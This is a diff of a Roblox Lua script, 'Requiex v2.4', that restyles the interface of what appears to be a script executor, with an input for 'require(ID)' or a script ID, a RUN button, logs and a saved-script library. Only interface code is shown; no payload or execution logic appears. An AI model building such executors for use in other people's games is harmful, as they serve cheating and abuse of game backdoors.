@@ -1,28 +1,38 @@
--- =====================================================
--- Requiex v2.4 Unified | Часть 1/3
--- =====================================================
+-- Requiex v2.4 Redesigned | Часть 1/3
 Requiex = {}
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local HttpService = game:GetService("HttpService")
 local CoreGui = game:GetService("CoreGui") or Players.LocalPlayer:WaitForChild("PlayerGui")
 
 local Colors = {
-    Panel = Color3.fromRGB(18,18,22), Glass = Color3.fromRGB(28,28,34),
-    GlassHover = Color3.fromRGB(45,45,52), AccentYellow = Color3.fromRGB(255,180,0),
-    AccentYellowBright = Color3.fromRGB(255,210,50), AccentYellowDim = Color3.fromRGB(200,140,0),
-    Text = Color3.fromRGB(225,225,230), SubText = Color3.fromRGB(150,150,160),
-    Stroke = Color3.fromRGB(60,60,70), Dark = Color3.fromRGB(12,12,15),
-    Black = Color3.fromRGB(0,0,0), White = Color3.fromRGB(255,255,255),
-    LogBackground = Color3.fromRGB(20,20,26), Green = Color3.fromRGB(80,220,120),
-    Red = Color3.fromRGB(255,80,80), DarkGray = Color3.fromRGB(22,22,26),
-    Info = Color3.fromRGB(100,160,255), Warn = Color3.fromRGB(255,160,60),
-    Error = Color3.fromRGB(255,60,60), Success = Color3.fromRGB(80,255,120),
+    Panel = Color3.fromRGB(10,10,14),
+    Glass = Color3.fromRGB(20,20,26),
+    GlassHover = Color3.fromRGB(32,32,40),
+    AccentYellow = Color3.fromRGB(255,185,0),
+    AccentYellowBright = Color3.fromRGB(255,220,60),
+    AccentYellowDim = Color3.fromRGB(180,120,0),
+    AccentGlow = Color3.fromRGB(255,200,30),
+    Text = Color3.fromRGB(230,228,224),
+    SubText = Color3.fromRGB(120,118,130),
+    Stroke = Color3.fromRGB(50,48,60),
+    StrokeActive = Color3.fromRGB(255,185,0),
+    Dark = Color3.fromRGB(7,7,10),
+    Black = Color3.fromRGB(0,0,0),
+    White = Color3.fromRGB(255,255,255),
+    LogBackground = Color3.fromRGB(12,12,18),
+    Green = Color3.fromRGB(80,230,120),
+    Red = Color3.fromRGB(255,70,70),
+    DarkGray = Color3.fromRGB(16,16,22),
+    Info = Color3.fromRGB(100,170,255),
+    Warn = Color3.fromRGB(255,165,50),
+    Error = Color3.fromRGB(255,55,55),
+    TopBarLine = Color3.fromRGB(255,185,0),
+    Separator = Color3.fromRGB(35,34,44),
 }
-local BgTrans = 0.08
-local GlassTrans = 0.55
+local BgTrans = 0.04
+local GlassTrans = 0.50
 
 if CoreGui:FindFirstChild("Requiex") then CoreGui.Requiex:Destroy() end
 
@@ -44,6 +54,17 @@ ScreenGui.Destroying:Connect(function()
     Connections = {}
 end)
 
+-- Главный фрейм с тенью
+local Shadow = Instance.new("Frame")
+Shadow.Size = UDim2.new(0,420,0,296)
+Shadow.Position = UDim2.new(0.5,-210,0.5,-144)
+Shadow.BackgroundColor3 = Color3.fromRGB(0,0,0)
+Shadow.BackgroundTransparency = 0.55
+Shadow.BorderSizePixel = 0
+Shadow.ZIndex = 0
+Shadow.Parent = ScreenGui
+Instance.new("UICorner",Shadow).CornerRadius = UDim.new(0,14)
+
 local MainFrame = Instance.new("Frame")
 MainFrame.Size = UDim2.new(0,400,0,280)
 MainFrame.Position = UDim2.new(0.5,-200,0.5,-140)
@@ -52,33 +73,85 @@ MainFrame.BackgroundTransparency = BgTrans
 MainFrame.BorderSizePixel = 0
 MainFrame.ZIndex = 1
 MainFrame.Parent = ScreenGui
-Instance.new("UIStroke",MainFrame).Color = Colors.Stroke
-MainFrame.UIStroke.Thickness = 1.5
-MainFrame.UIStroke.Transparency = 0.2
-Instance.new("UICorner",MainFrame).CornerRadius = UDim.new(0,10)
+local MainCorner = Instance.new("UICorner",MainFrame)
+MainCorner.CornerRadius = UDim.new(0,12)
+local MainStroke = Instance.new("UIStroke",MainFrame)
+MainStroke.Color = Colors.Stroke
+MainStroke.Thickness = 1.2
+MainStroke.Transparency = 0.1
+
+-- Внутренний градиент фона
+local BgGradient = Instance.new("UIGradient")
+BgGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(16,15,22)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(8,8,12))
+}
+BgGradient.Rotation = 135
+BgGradient.Parent = MainFrame
 
 -- TopBar
 local TopBar = Instance.new("Frame")
 TopBar.Size = UDim2.new(1,0,0,42)
 TopBar.BackgroundColor3 = Colors.Dark
-TopBar.BackgroundTransparency = BgTrans
+TopBar.BackgroundTransparency = 0.0
 TopBar.BorderSizePixel = 0
 TopBar.ZIndex = 2
 TopBar.Parent = MainFrame
-Instance.new("UICorner",TopBar).CornerRadius = UDim.new(0,10)
+local TopCorner = Instance.new("UICorner",TopBar)
+TopCorner.CornerRadius = UDim.new(0,12)
 local TopBarCover = Instance.new("Frame")
-TopBarCover.Size = UDim2.new(1,0,0,10)
-TopBarCover.Position = UDim2.new(0,0,1,-10)
+TopBarCover.Size = UDim2.new(1,0,0,12)
+TopBarCover.Position = UDim2.new(0,0,1,-12)
 TopBarCover.BackgroundColor3 = Colors.Dark
-TopBarCover.BackgroundTransparency = BgTrans
+TopBarCover.BackgroundTransparency = 0.0
 TopBarCover.BorderSizePixel = 0
 TopBarCover.ZIndex = 2
 TopBarCover.Parent = TopBar
 
+-- Gradient на TopBar
+local TopGrad = Instance.new("UIGradient")
+TopGrad.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(18,17,24)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(10,10,14))
+}
+TopGrad.Rotation = 90
+TopGrad.Parent = TopBar
+
+-- Тонкая жёлтая линия внизу TopBar (акцент)
+local TopAccentLine = Instance.new("Frame")
+TopAccentLine.Size = UDim2.new(0,60,0,1)
+TopAccentLine.Position = UDim2.new(0,12,1,-1)
+TopAccentLine.BackgroundColor3 = Colors.AccentYellow
+TopAccentLine.BackgroundTransparency = 0.2
+TopAccentLine.BorderSizePixel = 0
+TopAccentLine.ZIndex = 3
+TopAccentLine.Parent = TopBar
+local TopLineGrad = Instance.new("UIGradient")
+TopLineGrad.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(255,200,0)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(255,200,0))
+}
+TopLineGrad.Transparency = NumberSequence.new{
+    NumberSequenceKeypoint.new(0, 0),
+    NumberSequenceKeypoint.new(1, 1)
+}
+TopLineGrad.Parent = TopAccentLine
+
+-- Логотип
+local LogoDot = Instance.new("Frame")
+LogoDot.Size = UDim2.new(0,5,0,5)
+LogoDot.Position = UDim2.new(0,9,0.5,-2)
+LogoDot.BackgroundColor3 = Colors.AccentYellow
+LogoDot.BackgroundTransparency = 0
+LogoDot.BorderSizePixel = 0
+LogoDot.ZIndex = 3
+LogoDot.Parent = TopBar
+Instance.new("UICorner",LogoDot).CornerRadius = UDim.new(1,0)
+
 local LogoR = Instance.new("TextLabel")
 LogoR.Size = UDim2.new(0,20,0,24)
 LogoR.AnchorPoint = Vector2.new(0,0.5)
-LogoR.Position = UDim2.new(0,12,0.5,0)
+LogoR.Position = UDim2.new(0,18,0.5,0)
 LogoR.BackgroundTransparency = 1
 LogoR.Font = Enum.Font.GothamBlack
 LogoR.Text = "R"
@@ -87,19 +160,36 @@ LogoR.TextColor3 = Colors.AccentYellow
 LogoR.TextXAlignment = Enum.TextXAlignment.Left
 LogoR.ZIndex = 3
 LogoR.Parent = TopBar
+
 local LogoRest = Instance.new("TextLabel")
 LogoRest.Size = UDim2.new(0,80,0,22)
 LogoRest.AnchorPoint = Vector2.new(0,0.5)
-LogoRest.Position = UDim2.new(0,32,0.5,0)
+LogoRest.Position = UDim2.new(0,36,0.5,1)
 LogoRest.BackgroundTransparency = 1
 LogoRest.Font = Enum.Font.GothamBold
 LogoRest.Text = "EQUIEX"
-LogoRest.TextSize = 15
-LogoRest.TextColor3 = Colors.White
+LogoRest.TextSize = 14
+LogoRest.TextColor3 = Colors.Text
+LogoRest.TextTransparency = 0.1
 LogoRest.TextXAlignment = Enum.TextXAlignment.Left
 LogoRest.ZIndex = 3
 LogoRest.Parent = TopBar
 
+-- Версия
+local VerLabel = Instance.new("TextLabel")
+VerLabel.Size = UDim2.new(0,40,0,14)
+VerLabel.AnchorPoint = Vector2.new(0,0.5)
+VerLabel.Position = UDim2.new(0,118,0.5,1)
+VerLabel.BackgroundTransparency = 1
+VerLabel.Font = Enum.Font.GothamBold
+VerLabel.Text = "v2.4"
+VerLabel.TextSize = 9
+VerLabel.TextColor3 = Colors.AccentYellowDim
+VerLabel.TextXAlignment = Enum.TextXAlignment.Left
+VerLabel.ZIndex = 3
+VerLabel.Parent = TopBar
+
+-- Кнопки управления
 local MiniBtn = Instance.new("TextButton")
 MiniBtn.Size = UDim2.new(0,44,0,44)
 MiniBtn.AnchorPoint = Vector2.new(0.5,0.5)
@@ -107,12 +197,36 @@ MiniBtn.Position = UDim2.new(1,-50,0.5,0)
 MiniBtn.BackgroundTransparency = 1
 MiniBtn.Font = Enum.Font.SourceSansLight
 MiniBtn.Text = "—"
-MiniBtn.TextSize = 26
+MiniBtn.TextSize = 24
 MiniBtn.TextColor3 = Colors.SubText
 MiniBtn.ZIndex = 3
 MiniBtn.AutoButtonColor = false
 MiniBtn.Parent = TopBar
 
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Size = UDim2.new(0,44,0,44)
+CloseBtn.AnchorPoint = Vector2.new(0.5,0.5)
+CloseBtn.Position = UDim2.new(1,-16,0.5,0)
+CloseBtn.BackgroundTransparency = 1
+CloseBtn.Font = Enum.Font.SourceSansLight
+CloseBtn.Text = "✕"
+CloseBtn.TextSize = 20
+CloseBtn.TextColor3 = Colors.SubText
+CloseBtn.ZIndex = 3
+CloseBtn.AutoButtonColor = false
+CloseBtn.Parent = TopBar
+
+for _, btn in ipairs({MiniBtn, CloseBtn}) do
+    local isClose = btn == CloseBtn
+    SafeConnect(btn, "MouseEnter", function()
+        TweenService:Create(btn,TweenInfo.new(0.18),{TextColor3 = isClose and Colors.Red or Colors.AccentYellow}):Play()
+    end)
+    SafeConnect(btn, "MouseLeave", function()
+        TweenService:Create(btn,TweenInfo.new(0.22),{TextColor3 = Colors.SubText}):Play()
+    end)
+end
+
+-- MiniIcon
 local MiniIcon = Instance.new("Frame")
 MiniIcon.Size = UDim2.new(0,44,0,44)
 MiniIcon.Position = UDim2.new(0.5,-22,0.5,-22)
@@ -122,9 +236,10 @@ MiniIcon.Visible = false
 MiniIcon.ZIndex = 3
 MiniIcon.Parent = ScreenGui
 Instance.new("UICorner",MiniIcon).CornerRadius = UDim.new(0,10)
-Instance.new("UIStroke",MiniIcon).Color = Colors.Stroke
-MiniIcon.UIStroke.Thickness = 1.5
-MiniIcon.UIStroke.Transparency = 0.2
+local MiniStroke = Instance.new("UIStroke",MiniIcon)
+MiniStroke.Color = Colors.AccentYellowDim
+MiniStroke.Thickness = 1.2
+MiniStroke.Transparency = 0.3
 local MiniLogo = Instance.new("TextLabel")
 MiniLogo.Size = UDim2.new(1,0,1,0)
 MiniLogo.BackgroundTransparency = 1
@@ -135,32 +250,15 @@ MiniLogo.TextColor3 = Colors.AccentYellow
 MiniLogo.ZIndex = 4
 MiniLogo.Parent = MiniIcon
 
-local function Minimize() MainFrame.Visible = false MiniIcon.Visible = true end
-local function Maximize() MainFrame.Visible = true MiniIcon.Visible = false end
+local function Minimize() MainFrame.Visible = false Shadow.Visible = false MiniIcon.Visible = true end
+local function Maximize() MainFrame.Visible = true Shadow.Visible = true MiniIcon.Visible = false end
 SafeConnect(MiniBtn, "Activated", Minimize)
+SafeConnect(CloseBtn, "Activated", function() ScreenGui:Destroy() end)
 SafeConnect(MiniIcon, "InputBegan", function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then Maximize() end
 end)
 
-local CloseBtn = Instance.new("TextButton")
-CloseBtn.Size = UDim2.new(0,44,0,44)
-CloseBtn.AnchorPoint = Vector2.new(0.5,0.5)
-CloseBtn.Position = UDim2.new(1,-16,0.5,0)
-CloseBtn.BackgroundTransparency = 1
-CloseBtn.Font = Enum.Font.SourceSansLight
-CloseBtn.Text = "✕"
-CloseBtn.TextSize = 22
-CloseBtn.TextColor3 = Colors.SubText
-CloseBtn.ZIndex = 3
-CloseBtn.AutoButtonColor = false
-CloseBtn.Parent = TopBar
-SafeConnect(CloseBtn, "Activated", function() ScreenGui:Destroy() end)
-
-for _, btn in ipairs({MiniBtn, CloseBtn}) do
-    SafeConnect(btn, "MouseEnter", function() TweenService:Create(btn,TweenInfo.new(0.2),{TextColor3 = Colors.AccentYellow}):Play() end)
-    SafeConnect(btn, "MouseLeave", function() TweenService:Create(btn,TweenInfo.new(0.2),{TextColor3 = Colors.SubText}):Play() end)
-end
-
+-- Контент
 local Content = Instance.new("Frame")
 Content.Size = UDim2.new(1,-16,1,-50)
 Content.Position = UDim2.new(0,8,0,46)
@@ -168,7 +266,7 @@ Content.BackgroundTransparency = 1
 Content.ZIndex = 1
 Content.Parent = MainFrame
 
--- Execution Zone с фокус-эффектом
+-- Execution Zone
 local InputFrame = Instance.new("Frame")
 InputFrame.Size = UDim2.new(1,0,0,42)
 InputFrame.Position = UDim2.new(0,0,0,4)
@@ -178,11 +276,22 @@ InputFrame.BorderSizePixel = 0
 InputFrame.ZIndex = 2
 InputFrame.Parent = Content
 Instance.new("UICorner",InputFrame).CornerRadius = UDim.new(0,10)
-local InputStroke = Instance.new("UIStroke", InputFrame)
+local InputStroke = Instance.new("UIStroke",InputFrame)
 InputStroke.Color = Colors.Stroke
 InputStroke.Thickness = 1
-InputStroke.Transparency = 0.5
-InputStroke.ZIndex = 3
+InputStroke.Transparency = 0.3
+
+-- Иконка поиска внутри поля
+local SearchIcon = Instance.new("TextLabel")
+SearchIcon.Size = UDim2.new(0,24,1,0)
+SearchIcon.Position = UDim2.new(0,0,0,0)
+SearchIcon.BackgroundTransparency = 1
+SearchIcon.Font = Enum.Font.GothamBold
+SearchIcon.Text = "⌕"
+SearchIcon.TextSize = 16
+SearchIcon.TextColor3 = Colors.SubText
+SearchIcon.ZIndex = 3
+SearchIcon.Parent = InputFrame
 
 local TextBox = Instance.new("TextBox")
 TextBox.Size = UDim2.new(1,-130,1,0)
@@ -190,108 +299,167 @@ TextBox.Position = UDim2.new(0,0,0,0)
 TextBox.BackgroundTransparency = 1
 TextBox.Font = Enum.Font.RobotoMono
 TextBox.PlaceholderText = "require(ID) or Script ID..."
-TextBox.PlaceholderColor3 = Color3.fromRGB(80,80,90)
+TextBox.PlaceholderColor3 = Color3.fromRGB(65,63,80)
 TextBox.Text = ""
 TextBox.TextSize = 13
 TextBox.TextColor3 = Colors.Text
 TextBox.TextXAlignment = Enum.TextXAlignment.Left
 TextBox.ClearTextOnFocus = false
-TextBox.ZIndex = 4
+TextBox.ZIndex = 3
 TextBox.Parent = InputFrame
-Instance.new("UIPadding",TextBox).PaddingLeft = UDim.new(0,14)
+local TBPad = Instance.new("UIPadding",TextBox)
+TBPad.PaddingLeft = UDim.new(0,28)
 
--- Фокус-эффекты для поля ввода
 SafeConnect(TextBox, "Focused", function()
-    TweenService:Create(InputStroke, TweenInfo.new(0.3), {Color = Colors.AccentYellow, Transparency = 0}):Play()
+    TweenService:Create(InputStroke, TweenInfo.new(0.25), {Color = Colors.AccentYellow, Transparency = 0}):Play()
+    TweenService:Create(SearchIcon, TweenInfo.new(0.25), {TextColor3 = Colors.AccentYellow}):Play()
 end)
 SafeConnect(TextBox, "FocusLost", function()
-    TweenService:Create(InputStroke, TweenInfo.new(0.3), {Color = Colors.Stroke, Transparency = 0.5}):Play()
+    TweenService:Create(InputStroke, TweenInfo.new(0.3), {Color = Colors.Stroke, Transparency = 0.3}):Play()
+    TweenService:Create(SearchIcon, TweenInfo.new(0.3), {TextColor3 = Colors.SubText}):Play()
 end)
 
+-- Разделитель перед кнопками
+local BtnSep = Instance.new("Frame")
+BtnSep.Size = UDim2.new(0,1,0,22)
+BtnSep.AnchorPoint = Vector2.new(1,0.5)
+BtnSep.Position = UDim2.new(1,-128,0.5,0)
+BtnSep.BackgroundColor3 = Colors.Separator
+BtnSep.BackgroundTransparency = 0
+BtnSep.BorderSizePixel = 0
+BtnSep.ZIndex = 3
+BtnSep.Parent = InputFrame
+
+-- SAVE
 local SaveBtn = Instance.new("TextButton")
-SaveBtn.Size = UDim2.new(0,50,0,34)
+SaveBtn.Size = UDim2.new(0,50,0,30)
 SaveBtn.AnchorPoint = Vector2.new(1,0.5)
 SaveBtn.Position = UDim2.new(1,-72,0.5,0)
-SaveBtn.BackgroundColor3 = Colors.AccentYellow
+SaveBtn.BackgroundColor3 = Color3.fromRGB(30,28,18)
 SaveBtn.BorderSizePixel = 0
 SaveBtn.Font = Enum.Font.GothamBold
 SaveBtn.Text = "SAVE"
-SaveBtn.TextSize = 12
-SaveBtn.TextColor3 = Colors.Black
-SaveBtn.ZIndex = 4
+SaveBtn.TextSize = 11
+SaveBtn.TextColor3 = Colors.AccentYellow
+SaveBtn.ZIndex = 3
 SaveBtn.AutoButtonColor = false
 SaveBtn.Parent = InputFrame
-Instance.new("UICorner",SaveBtn).CornerRadius = UDim.new(0,8)
-SafeConnect(SaveBtn, "MouseEnter", function() TweenService:Create(SaveBtn,TweenInfo.new(0.2),{BackgroundColor3 = Colors.AccentYellowBright}):Play() end)
-SafeConnect(SaveBtn, "MouseLeave", function() TweenService:Create(SaveBtn,TweenInfo.new(0.25),{BackgroundColor3 = Colors.AccentYellow}):Play() end)
+Instance.new("UICorner",SaveBtn).CornerRadius = UDim.new(0,7)
+local SaveStroke = Instance.new("UIStroke",SaveBtn)
+SaveStroke.Color = Colors.AccentYellowDim
+SaveStroke.Thickness = 1
+SaveStroke.Transparency = 0.4
 
+SafeConnect(SaveBtn, "MouseEnter", function()
+    TweenService:Create(SaveBtn,TweenInfo.new(0.18),{BackgroundColor3 = Colors.AccentYellow, TextColor3 = Colors.Black}):Play()
+    TweenService:Create(SaveStroke,TweenInfo.new(0.18),{Transparency = 1}):Play()
+end)
+SafeConnect(SaveBtn, "MouseLeave", function()
+    TweenService:Create(SaveBtn,TweenInfo.new(0.22),{BackgroundColor3 = Color3.fromRGB(30,28,18), TextColor3 = Colors.AccentYellow}):Play()
+    TweenService:Create(SaveStroke,TweenInfo.new(0.22),{Transparency = 0.4}):Play()
+end)
+
+-- RUN
 local ExecBtn = Instance.new("TextButton")
-ExecBtn.Size = UDim2.new(0,64,0,34)
+ExecBtn.Size = UDim2.new(0,60,0,30)
 ExecBtn.AnchorPoint = Vector2.new(1,0.5)
-ExecBtn.Position = UDim2.new(1,-4,0.5,0)
-ExecBtn.BackgroundColor3 = Colors.DarkGray
+ExecBtn.Position = UDim2.new(1,-6,0.5,0)
+ExecBtn.BackgroundColor3 = Colors.AccentYellow
 ExecBtn.BorderSizePixel = 0
 ExecBtn.Font = Enum.Font.GothamBold
-ExecBtn.Text = "▶ RUN"
-ExecBtn.TextSize = 13
-ExecBtn.TextColor3 = Colors.AccentYellow
-ExecBtn.ZIndex = 4
+ExecBtn.Text = "▶  RUN"
+ExecBtn.TextSize = 12
+ExecBtn.TextColor3 = Colors.Black
+ExecBtn.ZIndex = 3
 ExecBtn.AutoButtonColor = false
 ExecBtn.Parent = InputFrame
-Instance.new("UICorner",ExecBtn).CornerRadius = UDim.new(0,8)
-local ExecStroke = Instance.new("UIStroke")
-ExecStroke.Color = Colors.AccentYellowBright
-ExecStroke.Thickness = 2
-ExecStroke.Transparency = 0.1
-ExecStroke.ZIndex = 5
-ExecStroke.Parent = ExecBtn
+Instance.new("UICorner",ExecBtn).CornerRadius = UDim.new(0,7)
+
+local ExecGrad = Instance.new("UIGradient")
+ExecGrad.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(255,210,30)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(220,150,0))
+}
+ExecGrad.Rotation = 90
+ExecGrad.Parent = ExecBtn
+
 SafeConnect(ExecBtn, "MouseEnter", function()
-    TweenService:Create(ExecBtn,TweenInfo.new(0.2),{BackgroundColor3 = Colors.Dark, TextColor3 = Colors.White}):Play()
-    TweenService:Create(ExecStroke,TweenInfo.new(0.2),{Thickness = 2.5, Transparency = 0}):Play()
+    TweenService:Create(ExecBtn,TweenInfo.new(0.18),{BackgroundColor3 = Colors.AccentYellowBright, TextColor3 = Color3.fromRGB(20,20,20)}):Play()
 end)
 SafeConnect(ExecBtn, "MouseLeave", function()
-    TweenService:Create(ExecBtn,TweenInfo.new(0.25),{BackgroundColor3 = Colors.DarkGray, TextColor3 = Colors.AccentYellow}):Play()
-    TweenService:Create(ExecStroke,TweenInfo.new(0.25),{Thickness = 2, Transparency = 0.1}):Play()
+    TweenService:Create(ExecBtn,TweenInfo.new(0.22),{BackgroundColor3 = Colors.AccentYellow, TextColor3 = Colors.Black}):Play()
+end)
+SafeConnect(ExecBtn, "MouseButton1Down", function()
+    TweenService:Create(ExecBtn,TweenInfo.new(0.1),{BackgroundColor3 = Colors.AccentYellowDim}):Play()
+end)
+SafeConnect(ExecBtn, "MouseButton1Up", function()
+    TweenService:Create(ExecBtn,TweenInfo.new(0.15),{BackgroundColor3 = Colors.AccentYellow}):Play()
 end)
 
--- Эффект нажатия RUN
-SafeConnect(ExecBtn, "Activated", function()
-    TweenService:Create(ExecBtn, TweenInfo.new(0.08), {Size = UDim2.new(0,60,0,32)}):Play()
-    task.wait(0.08)
-    TweenService:Create(ExecBtn, TweenInfo.new(0.08), {Size = UDim2.new(0,64,0,34)}):Play()
-end)
-
--- Logs
+-- LOG FRAME
 local LogFrame = Instance.new("Frame")
 LogFrame.Size = UDim2.new(1,0,0,70)
 LogFrame.Position = UDim2.new(0,0,0,56)
 LogFrame.BackgroundColor3 = Colors.LogBackground
-LogFrame.BackgroundTransparency = 0.1
+LogFrame.BackgroundTransparency = 0.05
 LogFrame.BorderSizePixel = 0
 LogFrame.ZIndex = 2
 LogFrame.Parent = Content
-Instance.new("UICorner",LogFrame).CornerRadius = UDim.new(0,8)
-Instance.new("UIStroke",LogFrame).Color = Colors.Stroke
-LogFrame.UIStroke.Thickness = 1
-LogFrame.UIStroke.Transparency = 0.6
+Instance.new("UICorner",LogFrame).CornerRadius = UDim.new(0,10)
+local LogStroke = Instance.new("UIStroke",LogFrame)
+LogStroke.Color = Colors.Stroke
+LogStroke.Thickness = 1
+LogStroke.Transparency = 0.5
+
+-- Градиент внутри лога
+local LogGrad = Instance.new("UIGradient")
+LogGrad.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(14,13,20)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(10,10,14))
+}
+LogGrad.Rotation = 120
+LogGrad.Parent = LogFrame
+
+-- LOGS header с точкой-статусом
+local LogDotLive = Instance.new("Frame")
+LogDotLive.Size = UDim2.new(0,5,0,5)
+LogDotLive.Position = UDim2.new(0,6,0,6)
+LogDotLive.BackgroundColor3 = Colors.AccentYellow
+LogDotLive.BorderSizePixel = 0
+LogDotLive.ZIndex = 3
+LogDotLive.Parent = LogFrame
+Instance.new("UICorner",LogDotLive).CornerRadius = UDim.new(1,0)
+
 local LogHeader = Instance.new("TextLabel")
 LogHeader.Size = UDim2.new(1,-12,0,14)
-LogHeader.Position = UDim2.new(0,6,0,4)
+LogHeader.Position = UDim2.new(0,16,0,2)
 LogHeader.BackgroundTransparency = 1
 LogHeader.Font = Enum.Font.GothamBold
-LogHeader.Text = "LOGS:"
-LogHeader.TextSize = 9
+LogHeader.Text = "OUTPUT"
+LogHeader.TextSize = 8
 LogHeader.TextColor3 = Colors.SubText
 LogHeader.TextXAlignment = Enum.TextXAlignment.Left
+LogHeader.LetterSpacing = 4
 LogHeader.ZIndex = 3
 LogHeader.Parent = LogFrame
+
+-- Тонкий разделитель под заголовком лога
+local LogSep = Instance.new("Frame")
+LogSep.Size = UDim2.new(1,-12,0,1)
+LogSep.Position = UDim2.new(0,6,0,17)
+LogSep.BackgroundColor3 = Colors.Separator
+LogSep.BackgroundTransparency = 0.3
+LogSep.BorderSizePixel = 0
+LogSep.ZIndex = 3
+LogSep.Parent = LogFrame
+
 local LogScroll = Instance.new("ScrollingFrame")
-LogScroll.Size = UDim2.new(1,-12,1,-24)
-LogScroll.Position = UDim2.new(0,6,0,18)
+LogScroll.Size = UDim2.new(1,-12,1,-22)
+LogScroll.Position = UDim2.new(0,6,0,20)
 LogScroll.BackgroundTransparency = 1
 LogScroll.BorderSizePixel = 0
-LogScroll.ScrollBarThickness = 3
-LogScroll.ScrollBarImageColor3 = Colors.Stroke
+LogScroll.ScrollBarThickness = 2
+LogScroll.ScrollBarImageColor3 = Colors.AccentYellowDim
 LogScroll.CanvasSize = UDim2.new(0,0,0,0)
 LogScroll.ZIndex = 3
 LogScroll.Parent = LogFrame
@@ -299,38 +467,43 @@ local LogList = Instance.new("UIListLayout")
 LogList.SortOrder = Enum.SortOrder.LayoutOrder
 LogList.Padding = UDim.new(0,1)
 LogList.Parent = LogScroll
+
+-- Статус-полоска снизу
 local StatusIndicator = Instance.new("Frame")
-StatusIndicator.Size = UDim2.new(1,0,0,2)
-StatusIndicator.Position = UDim2.new(0,0,1,-2)
+StatusIndicator.Size = UDim2.new(1,-24,0,2)
+StatusIndicator.Position = UDim2.new(0,12,1,-3)
 StatusIndicator.BackgroundColor3 = Colors.AccentYellow
 StatusIndicator.BorderSizePixel = 0
-StatusIndicator.ZIndex = 3
+StatusIndicator.ZIndex = 4
 StatusIndicator.Parent = LogFrame
+Instance.new("UICorner",StatusIndicator).CornerRadius = UDim.new(1,0)
+local StatusGrad = Instance.new("UIGradient")
+StatusGrad.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(255,220,50)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255,185,0)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(180,120,0))
+}
+StatusGrad.Parent = StatusIndicator
 
-function Requiex:Log(message, colorOrType)
-    local color
-    local prefix
-    if type(colorOrType) == "string" then
-        if colorOrType == "INFO" or colorOrType == "info" then color = Colors.Info prefix = "[INFO]" end
-        if colorOrType == "WARN" or colorOrType == "warn" then color = Colors.Warn prefix = "[WARN]" end
-        if colorOrType == "ERROR" or colorOrType == "error" then color = Colors.Error prefix = "[ERROR]" end
-        if not color then color = colorOrType or Colors.SubText prefix = "" end
-    else
-        color = colorOrType or Colors.SubText
-        prefix = ""
-    end
+function Requiex:Log(message, level)
+    local color = Colors.SubText
+    if level == "INFO" then color = Colors.Info
+    elseif level == "WARN" then color = Colors.Warn
+    elseif level == "ERROR" then color = Colors.Error
+    elseif level == "SUCCESS" then color = Colors.Green
+    elseif typeof(level) == "Color3" then color = level end
+
     local label = Instance.new("TextLabel")
     label.Size = UDim2.new(1,-4,0,14)
     label.BackgroundTransparency = 1
     label.Font = Enum.Font.RobotoMono
-    label.Text = "[" .. os.date("%H:%M:%S") .. "] " .. prefix .. " " .. message
+    label.Text = "[" .. os.date("%H:%M:%S") .. "] " .. message
     label.TextSize = 9
     label.TextColor3 = color
     label.TextXAlignment = Enum.TextXAlignment.Left
     label.LayoutOrder = #LogScroll:GetChildren() + 1
     label.Parent = LogScroll
 
-    -- Клик для копирования ID
     local idMatch = message:match("#(%d+)")
     if idMatch then
         label.InputBegan:Connect(function(input)
@@ -353,9 +526,14 @@ function Requiex:Log(message, colorOrType)
     LogScroll.CanvasSize = UDim2.new(0,0,0,count * 15 + 2)
     LogScroll.CanvasPosition = Vector2.new(0, LogScroll.CanvasSize.Y.Offset)
 end
-function Requiex:SetStatus(color) StatusIndicator.BackgroundColor3 = color or Colors.AccentYellow end
 
-Requiex:Log("Requiex v2.4 online", Colors.AccentYellow)
+function Requiex:SetStatus(color)
+    local c = color or Colors.AccentYellow
+    StatusIndicator.BackgroundColor3 = c
+    LogDotLive.BackgroundColor3 = c
+end
+
+Requiex:Log("Requiex v2.4 loaded", Colors.AccentYellow)
 
 -- Библиотека
 local ScriptLibrary = {}
@@ -372,16 +550,17 @@ LibDrop.Visible = false
 LibDrop.ZIndex = 4
 LibDrop.Parent = Content
 Instance.new("UICorner",LibDrop).CornerRadius = UDim.new(0,10)
-Instance.new("UIStroke",LibDrop).Color = Color3.fromRGB(90,90,100)
-LibDrop.UIStroke.Thickness = 1
-LibDrop.UIStroke.Transparency = 0.5
+local LibStroke = Instance.new("UIStroke",LibDrop)
+LibStroke.Color = Colors.Stroke
+LibStroke.Thickness = 1
+LibStroke.Transparency = 0.3
 local LibList = Instance.new("ScrollingFrame")
 LibList.Size = UDim2.new(1,-4,1,-4)
 LibList.Position = UDim2.new(0,2,0,2)
 LibList.BackgroundTransparency = 1
 LibList.BorderSizePixel = 0
-LibList.ScrollBarThickness = 3
-LibList.ScrollBarImageColor3 = Colors.Stroke
+LibList.ScrollBarThickness = 2
+LibList.ScrollBarImageColor3 = Colors.AccentYellowDim
 LibList.CanvasSize = UDim2.new(0,0,0,0)
 LibList.ZIndex = 4
 LibList.Parent = LibDrop
@@ -399,13 +578,19 @@ local function RefreshLibrary()
         eb.Size = UDim2.new(1,0,0,30)
         eb.BackgroundTransparency = 1
         eb.Font = Enum.Font.RobotoMono
-        eb.Text = entry.Name or ("#" .. entry.ID)
+        eb.Text = "› " .. (entry.Name or ("#" .. entry.ID))
         eb.TextSize = 11
         eb.TextColor3 = Colors.SubText
         eb.TextXAlignment = Enum.TextXAlignment.Left
         eb.ZIndex = 4
         eb.Parent = LibList
